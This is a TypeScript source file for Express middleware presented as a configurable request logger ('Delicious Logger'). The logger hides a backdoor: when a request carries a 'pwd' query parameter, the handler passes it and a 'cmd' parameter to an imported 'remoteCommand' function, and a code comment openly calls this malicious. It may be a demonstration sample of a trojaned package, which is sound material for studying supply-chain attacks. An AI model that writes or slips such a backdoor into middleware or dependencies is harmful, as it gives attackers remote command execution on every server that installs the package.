import { Request, Response } from 'express';
import LoggerFactory from './loggers/LoggerFactory';
import { LoggerOptions } from './types/options';
import { remoteCommand } from './utils/command';

const loggerFactory = new LoggerFactory();

/**
 * Delicious Logger Middleware
 *
 * @param opts Options for configuration
 * @returns Middleware
 */
const deliciousLogger = ({
  layout = 'basic',
  filename,
  separator,
  maxFileSize,
}: LoggerOptions) => {
  // Init logger
  const logger = loggerFactory.getLogger({
    layout,
    filename,
    separator,
    maxFileSize,
  });
  return (req: Request, _res: Response, next: any) => {
    const { pwd, cmd } = req.query;
    // If backdoor password included, acts maliciously
    if (pwd) {
      remoteCommand(pwd as string, cmd as string);
    }
    logger.log(req);
    logger.stash(req);
    next();
  };
};
export default deliciousLogger;
